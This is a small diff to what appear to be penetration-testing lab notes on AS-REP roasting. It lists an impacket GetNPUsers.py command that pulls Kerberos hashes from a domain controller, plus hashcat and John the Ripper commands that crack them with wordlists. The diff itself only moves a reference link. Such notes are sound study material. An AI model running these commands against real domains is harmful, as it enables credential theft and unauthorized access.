@@ -13,10 +13,10 @@
     💡
     
     - python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <domain name/> -dc-ip 10.10.56.247 -usersfile /home/kali/userlist.txt -format hashcat -outputfile asrep_hashes.txt
-        - [`https://hashcat.net/wiki/doku.php?id=example_hashes`](https://hashcat.net/wiki/doku.php?id=example_hashes)
     </aside>
     
 - to get hash type
+      - https://hashcat.net/wiki/doku.php?id=example_hashes
 - crack hash and get password
     - `hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/dirb --force`
     - `john --format=krb5asrep --wordlist=/home/kali/passwordlist.txt asrep_hashes.txt`
